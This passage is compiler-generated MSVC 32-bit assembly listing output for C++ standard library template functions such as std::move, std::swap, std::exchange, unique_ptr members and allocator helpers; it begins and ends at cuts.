??__E?id@?$codecvt@DDU_Mbstatet@@@std@@2V0locale@2@A@@YAXXZ PROC ; `dynamic initializer for 'std::codecvt<char,char,_Mbstatet>::id'', COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xlocale
; Line 794
	push	ebp
	mov	ebp, esp
	push	0
	mov	ecx, OFFSET ?id@?$codecvt@DDU_Mbstatet@@@std@@2V0locale@2@A ; std::codecvt<char,char,_Mbstatet>::id
	call	??0id@locale@std@@QAE@I@Z		; std::locale::id::id
	pop	ebp
	ret	0
??__E?id@?$codecvt@DDU_Mbstatet@@@std@@2V0locale@2@A@@YAXXZ ENDP ; `dynamic initializer for 'std::codecvt<char,char,_Mbstatet>::id''
text$di	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$exchange@PAV_Facet_base@std@@$$T@std@@YAPAV_Facet_base@0@AAPAV10@$$QA$$T@Z
_TEXT	SEGMENT
__Old_val$ = -4						; size = 4
__Val$ = 8						; size = 4
__New_val$ = 12						; size = 4
??$exchange@PAV_Facet_base@std@@$$T@std@@YAPAV_Facet_base@0@AAPAV10@$$QA$$T@Z PROC ; std::exchange<std::_Facet_base *,std::nullptr_t>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\utility
; Line 614
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 616
	mov	eax, DWORD PTR __Val$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR __Old_val$[ebp], eax
; Line 617
	mov	eax, DWORD PTR __Val$[ebp]
	mov	ecx, DWORD PTR __New_val$[ebp]
	mov	ecx, DWORD PTR [ecx]
	mov	DWORD PTR [eax], ecx
; Line 618
	mov	eax, DWORD PTR __Old_val$[ebp]
; Line 619
	leave
	ret	0
??$exchange@PAV_Facet_base@std@@$$T@std@@YAPAV_Facet_base@0@AAPAV10@$$QA$$T@Z ENDP ; std::exchange<std::_Facet_base *,std::nullptr_t>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$move@AAPAV?$basic_ostream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAPAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAPAV?$basic_ostream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAPAV10@@Z PROC ; std::move<std::basic_ostream<char,std::char_traits<char> > * &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1455
	push	ebp
	mov	ebp, esp
; Line 1456
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1457
	pop	ebp
	ret	0
??$move@AAPAV?$basic_ostream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAPAV10@@Z ENDP ; std::move<std::basic_ostream<char,std::char_traits<char> > * &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$move@AAD@std@@YA$$QADAAD@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAD@std@@YA$$QADAAD@Z PROC			; std::move<char &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1455
	push	ebp
	mov	ebp, esp
; Line 1456
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1457
	pop	ebp
	ret	0
??$move@AAD@std@@YA$$QADAAD@Z ENDP			; std::move<char &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$move@AAPAD@std@@YA$$QAPADAAPAD@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAPAD@std@@YA$$QAPADAAPAD@Z PROC		; std::move<char * &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1455
	push	ebp
	mov	ebp, esp
; Line 1456
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1457
	pop	ebp
	ret	0
??$move@AAPAD@std@@YA$$QAPADAAPAD@Z ENDP		; std::move<char * &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPAXI@Z
_TEXT	SEGMENT
__Ptr$ = -12						; size = 4
__Block_size$ = -8					; size = 4
__Ptr_container$ = -4					; size = 4
__Bytes$ = 8						; size = 4
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPAXI@Z PROC ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xmemory
; Line 134
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
; Line 136
	mov	eax, DWORD PTR __Bytes$[ebp]
	add	eax, 35					; 00000023H
	mov	DWORD PTR __Block_size$[ebp], eax
; Line 137
	mov	eax, DWORD PTR __Block_size$[ebp]
	cmp	eax, DWORD PTR __Bytes$[ebp]
	ja	SHORT $LN8@Allocate_m
; Line 138
	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
$LN8@Allocate_m:
; Line 141
	push	DWORD PTR __Block_size$[ebp]
	call	?_Allocate@_Default_allocate_traits@std@@SAPAXI@Z ; std::_Default_allocate_traits::_Allocate
	pop	ecx
	mov	DWORD PTR __Ptr_container$[ebp], eax
$LN4@Allocate_m:
; Line 142
	cmp	DWORD PTR __Ptr_container$[ebp], 0
	je	SHORT $LN7@Allocate_m
	jmp	SHORT $LN2@Allocate_m
$LN7@Allocate_m:
	call	__invalid_parameter_noinfo_noreturn
	xor	eax, eax
	jne	SHORT $LN7@Allocate_m
$LN2@Allocate_m:
	xor	eax, eax
	jne	SHORT $LN4@Allocate_m
; Line 143
	mov	eax, DWORD PTR __Ptr_container$[ebp]
	add	eax, 35					; 00000023H
	and	eax, -32				; ffffffe0H
	mov	DWORD PTR __Ptr$[ebp], eax
; Line 144
	push	4
	pop	eax
	imul	eax, eax, -1
	mov	ecx, DWORD PTR __Ptr$[ebp]
	mov	edx, DWORD PTR __Ptr_container$[ebp]
	mov	DWORD PTR [ecx+eax], edx
; Line 149
	mov	eax, DWORD PTR __Ptr$[ebp]
$LN11@Allocate_m:
; Line 150
	leave
	ret	0
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPAXI@Z ENDP ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$forward@AAPAD@std@@YAAAPADAAPAD@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@AAPAD@std@@YAAAPADAAPAD@Z PROC		; std::forward<char * &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1443
	push	ebp
	mov	ebp, esp
; Line 1444
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1445
	pop	ebp
	ret	0
??$forward@AAPAD@std@@YAAAPADAAPAD@Z ENDP		; std::forward<char * &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$forward@ABQAD@std@@YAABQADABQAD@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@ABQAD@std@@YAABQADABQAD@Z PROC		; std::forward<char * const &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1443
	push	ebp
	mov	ebp, esp
; Line 1444
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1445
	pop	ebp
	ret	0
??$forward@ABQAD@std@@YAABQADABQAD@Z ENDP		; std::forward<char * const &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Voidify_iter@PAPAD@std@@YAPAXPAPAD@Z
_TEXT	SEGMENT
__It$ = 8						; size = 4
??$_Voidify_iter@PAPAD@std@@YAPAXPAPAD@Z PROC		; std::_Voidify_iter<char * *>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xutility
; Line 130
	push	ebp
	mov	ebp, esp
; Line 132
	mov	eax, DWORD PTR __It$[ebp]
; Line 136
	pop	ebp
	ret	0
??$_Voidify_iter@PAPAD@std@@YAPAXPAPAD@Z ENDP		; std::_Voidify_iter<char * *>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$addressof@PAD@std@@YAPAPADAAPAD@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@PAD@std@@YAPAPADAAPAD@Z PROC		; std::addressof<char *>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstddef
; Line 274
	push	ebp
	mov	ebp, esp
; Line 275
	mov	eax, DWORD PTR __Val$[ebp]
; Line 276
	pop	ebp
	ret	0
??$addressof@PAD@std@@YAPAPADAAPAD@Z ENDP		; std::addressof<char *>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$forward@V?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@V?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z PROC ; std::forward<std::allocator<char> >, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1443
	push	ebp
	mov	ebp, esp
; Line 1444
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1445
	pop	ebp
	ret	0
??$forward@V?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ENDP ; std::forward<std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$move@AAPAVlocale@std@@@std@@YA$$QAPAVlocale@0@AAPAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAPAVlocale@std@@@std@@YA$$QAPAVlocale@0@AAPAV10@@Z PROC ; std::move<std::locale * &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1455
	push	ebp
	mov	ebp, esp
; Line 1456
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1457
	pop	ebp
	ret	0
??$move@AAPAVlocale@std@@@std@@YA$$QAPAVlocale@0@AAPAV10@@Z ENDP ; std::move<std::locale * &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$move@AAPAU_Fnarray@ios_base@std@@@std@@YA$$QAPAU_Fnarray@ios_base@0@AAPAU120@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAPAU_Fnarray@ios_base@std@@@std@@YA$$QAPAU_Fnarray@ios_base@0@AAPAU120@@Z PROC ; std::move<std::ios_base::_Fnarray * &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1455
	push	ebp
	mov	ebp, esp
; Line 1456
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1457
	pop	ebp
	ret	0
??$move@AAPAU_Fnarray@ios_base@std@@@std@@YA$$QAPAU_Fnarray@ios_base@0@AAPAU120@@Z ENDP ; std::move<std::ios_base::_Fnarray * &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$move@AAPAU_Iosarray@ios_base@std@@@std@@YA$$QAPAU_Iosarray@ios_base@0@AAPAU120@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAPAU_Iosarray@ios_base@std@@@std@@YA$$QAPAU_Iosarray@ios_base@0@AAPAU120@@Z PROC ; std::move<std::ios_base::_Iosarray * &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1455
	push	ebp
	mov	ebp, esp
; Line 1456
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1457
	pop	ebp
	ret	0
??$move@AAPAU_Iosarray@ios_base@std@@@std@@YA$$QAPAU_Iosarray@ios_base@0@AAPAU120@@Z ENDP ; std::move<std::ios_base::_Iosarray * &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$move@AA_J@std@@YA$$QA_JAA_J@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AA_J@std@@YA$$QA_JAA_J@Z PROC			; std::move<__int64 &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1455
	push	ebp
	mov	ebp, esp
; Line 1456
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1457
	pop	ebp
	ret	0
??$move@AA_J@std@@YA$$QA_JAA_J@Z ENDP			; std::move<__int64 &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$move@AAH@std@@YA$$QAHAAH@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAH@std@@YA$$QAHAAH@Z PROC			; std::move<int &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1455
	push	ebp
	mov	ebp, esp
; Line 1456
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1457
	pop	ebp
	ret	0
??$move@AAH@std@@YA$$QAHAAH@Z ENDP			; std::move<int &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@PAV_Facet_base@1@@Z
_TEXT	SEGMENT
$T1 = -8						; size = 1
_this$ = -4						; size = 4
__Ptr$ = 8						; size = 4
??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@PAV_Facet_base@1@@Z PROC ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\memory
; Line 3173
	push	ebp
	mov	ebp, esp
	push	ecx
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
	lea	eax, DWORD PTR __Ptr$[ebp]
	push	eax
	push	DWORD PTR $T1[ebp]
	mov	ecx, DWORD PTR _this$[ebp]
	call	??$?0AAPAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@AAPAV_Facet_base@1@@Z ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>
	mov	eax, DWORD PTR _this$[ebp]
	leave
	ret	4
??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@PAV_Facet_base@1@@Z ENDP ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAEAAU?$default_delete@V_Facet_base@std@@@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAEAAU?$default_delete@V_Facet_base@std@@@2@XZ PROC ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xmemory
; Line 1397
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 1398
	mov	eax, DWORD PTR _this$[ebp]
; Line 1399
	leave
	ret	0
?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAEAAU?$default_delete@V_Facet_base@std@@@2@XZ ENDP ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAEPAV_Facet_base@2@XZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -4						; size = 4
?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAEPAV_Facet_base@2@XZ PROC ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\memory
; Line 3258
	push	ebp
	mov	ebp, esp
	push	ecx
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 3259
	and	DWORD PTR $T1[ebp], 0
	lea	eax, DWORD PTR $T1[ebp]
	push	eax
	push	DWORD PTR _this$[ebp]
	call	??$exchange@PAV_Facet_base@std@@$$T@std@@YAPAV_Facet_base@0@AAPAV10@$$QA$$T@Z ; std::exchange<std::_Facet_base *,std::nullptr_t>
	pop	ecx
	pop	ecx
; Line 3260
	leave
	ret	0
?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAEPAV_Facet_base@2@XZ ENDP ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@XZ PROC ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\memory
; Line 3228
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
; Line 3229
	mov	eax, DWORD PTR _this$[ebp]
	cmp	DWORD PTR [eax], 0
	je	SHORT $LN3@unique_ptr
; Line 3230
	mov	eax, DWORD PTR _this$[ebp]
	push	DWORD PTR [eax]
	mov	ecx, DWORD PTR _this$[ebp]
	call	?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAEAAU?$default_delete@V_Facet_base@std@@@2@XZ ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first
	mov	ecx, eax
	call	??R?$default_delete@V_Facet_base@std@@@std@@QBEXPAV_Facet_base@1@@Z ; std::default_delete<std::_Facet_base>::operator()
$LN3@unique_ptr:
; Line 3232
	leave
	ret	0
??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@XZ ENDP ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??R?$default_delete@V_Facet_base@std@@@std@@QBEXPAV_Facet_base@1@@Z
_TEXT	SEGMENT
_this$ = -12						; size = 4
tv70 = -8						; size = 4
$T1 = -4						; size = 4
__Ptr$ = 8						; size = 4
??R?$default_delete@V_Facet_base@std@@@std@@QBEXPAV_Facet_base@1@@Z PROC ; std::default_delete<std::_Facet_base>::operator(), COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\memory
; Line 3118
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
	mov	DWORD PTR _this$[ebp], ecx
; Line 3120
	mov	eax, DWORD PTR __Ptr$[ebp]
	mov	DWORD PTR $T1[ebp], eax
	cmp	DWORD PTR $T1[ebp], 0
	je	SHORT $LN3@operator
	push	1
	mov	eax, DWORD PTR $T1[ebp]
	mov	eax, DWORD PTR [eax]
	mov	ecx, DWORD PTR $T1[ebp]
	call	DWORD PTR [eax]
	mov	DWORD PTR tv70[ebp], eax
	jmp	SHORT $LN2@operator
$LN3@operator:
	and	DWORD PTR tv70[ebp], 0
$LN2@operator:
; Line 3121
	leave
	ret	4
??R?$default_delete@V_Facet_base@std@@@std@@QBEXPAV_Facet_base@1@@Z ENDP ; std::default_delete<std::_Facet_base>::operator()
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$swap@PAV?$basic_ostream@DU?$char_traits@D@std@@@std@@$0A@@std@@YAXAAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@0@Z
_TEXT	SEGMENT
__Tmp$ = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$swap@PAV?$basic_ostream@DU?$char_traits@D@std@@@std@@$0A@@std@@YAXAAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@0@Z PROC ; std::swap<std::basic_ostream<char,std::char_traits<char> > *,0>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\utility
; Line 103
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 104
	push	DWORD PTR __Left$[ebp]
	call	??$move@AAPAV?$basic_ostream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAPAV10@@Z ; std::move<std::basic_ostream<char,std::char_traits<char> > * &>
	pop	ecx
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR __Tmp$[ebp], eax
; Line 105
	push	DWORD PTR __Right$[ebp]
	call	??$move@AAPAV?$basic_ostream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAPAV10@@Z ; std::move<std::basic_ostream<char,std::char_traits<char> > * &>
	pop	ecx
	mov	ecx, DWORD PTR __Left$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [ecx], eax
; Line 106
	lea	eax, DWORD PTR __Tmp$[ebp]
	push	eax
	call	??$move@AAPAV?$basic_ostream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAPAV10@@Z ; std::move<std::basic_ostream<char,std::char_traits<char> > * &>
	pop	ecx
	mov	ecx, DWORD PTR __Right$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [ecx], eax
; Line 107
	leave
	ret	0
??$swap@PAV?$basic_ostream@DU?$char_traits@D@std@@@std@@$0A@@std@@YAXAAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@0@Z ENDP ; std::swap<std::basic_ostream<char,std::char_traits<char> > *,0>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$addressof@V?$basic_iostream@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_iostream@DU?$char_traits@D@std@@@0@AAV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@V?$basic_iostream@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_iostream@DU?$char_traits@D@std@@@0@AAV10@@Z PROC ; std::addressof<std::basic_iostream<char,std::char_traits<char> > >, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xstddef
; Line 274
	push	ebp
	mov	ebp, esp
; Line 275
	mov	eax, DWORD PTR __Val$[ebp]
; Line 276
	pop	ebp
	ret	0
??$addressof@V?$basic_iostream@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_iostream@DU?$char_traits@D@std@@@0@AAV10@@Z ENDP ; std::addressof<std::basic_iostream<char,std::char_traits<char> > >
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$swap@D$0A@@std@@YAXAAD0@Z
_TEXT	SEGMENT
__Tmp$ = -1						; size = 1
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$swap@D$0A@@std@@YAXAAD0@Z PROC			; std::swap<char,0>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\utility
; Line 103
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 104
	push	DWORD PTR __Left$[ebp]
	call	??$move@AAD@std@@YA$$QADAAD@Z		; std::move<char &>
	pop	ecx
	mov	al, BYTE PTR [eax]
	mov	BYTE PTR __Tmp$[ebp], al
; Line 105
	push	DWORD PTR __Right$[ebp]
	call	??$move@AAD@std@@YA$$QADAAD@Z		; std::move<char &>
	pop	ecx
	mov	ecx, DWORD PTR __Left$[ebp]
	mov	al, BYTE PTR [eax]
	mov	BYTE PTR [ecx], al
; Line 106
	lea	eax, DWORD PTR __Tmp$[ebp]
	push	eax
	call	??$move@AAD@std@@YA$$QADAAD@Z		; std::move<char &>
	pop	ecx
	mov	ecx, DWORD PTR __Right$[ebp]
	mov	al, BYTE PTR [eax]
	mov	BYTE PTR [ecx], al
; Line 107
	leave
	ret	0
??$swap@D$0A@@std@@YAXAAD0@Z ENDP			; std::swap<char,0>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$swap@PAD$0A@@std@@YAXAAPAD0@Z
_TEXT	SEGMENT
__Tmp$ = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$swap@PAD$0A@@std@@YAXAAPAD0@Z PROC			; std::swap<char *,0>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\utility
; Line 103
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 104
	push	DWORD PTR __Left$[ebp]
	call	??$move@AAPAD@std@@YA$$QAPADAAPAD@Z	; std::move<char * &>
	pop	ecx
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR __Tmp$[ebp], eax
; Line 105
	push	DWORD PTR __Right$[ebp]
	call	??$move@AAPAD@std@@YA$$QAPADAAPAD@Z	; std::move<char * &>
	pop	ecx
	mov	ecx, DWORD PTR __Left$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [ecx], eax
; Line 106
	lea	eax, DWORD PTR __Tmp$[ebp]
	push	eax
	call	??$move@AAPAD@std@@YA$$QAPADAAPAD@Z	; std::move<char * &>
	pop	ecx
	mov	ecx, DWORD PTR __Right$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [ecx], eax
; Line 107
	leave
	ret	0
??$swap@PAD$0A@@std@@YAXAAPAD0@Z ENDP			; std::swap<char *,0>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Allocate@$07U_Default_allocate_traits@std@@$0A@@std@@YAPAXI@Z
_TEXT	SEGMENT
__Bytes$ = 8						; size = 4
??$_Allocate@$07U_Default_allocate_traits@std@@$0A@@std@@YAPAXI@Z PROC ; std::_Allocate<8,std::_Default_allocate_traits,0>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xmemory
; Line 230
	push	ebp
	mov	ebp, esp
; Line 237
	cmp	DWORD PTR __Bytes$[ebp], 4096		; 00001000H
	jb	SHORT $LN2@Allocate
; Line 238
	push	DWORD PTR __Bytes$[ebp]
	call	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPAXI@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
	pop	ecx
	jmp	SHORT $LN1@Allocate
$LN2@Allocate:
; Line 243
	cmp	DWORD PTR __Bytes$[ebp], 0
	je	SHORT $LN3@Allocate
; Line 244
	push	DWORD PTR __Bytes$[ebp]
	call	?_Allocate@_Default_allocate_traits@std@@SAPAXI@Z ; std::_Default_allocate_traits::_Allocate
	pop	ecx
	jmp	SHORT $LN1@Allocate
$LN3@Allocate:
; Line 247
	xor	eax, eax
$LN1@Allocate:
; Line 248
	pop	ebp
	ret	0
??$_Allocate@$07U_Default_allocate_traits@std@@$0A@@std@@YAPAXI@Z ENDP ; std::_Allocate<8,std::_Default_allocate_traits,0>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$_Get_size_of_n@$00@std@@YAII@Z
_TEXT	SEGMENT
__Overflow_is_possible$ = -1				; size = 1
__Count$ = 8						; size = 4
??$_Get_size_of_n@$00@std@@YAII@Z PROC			; std::_Get_size_of_n<1>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xmemory
; Line 59
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 60
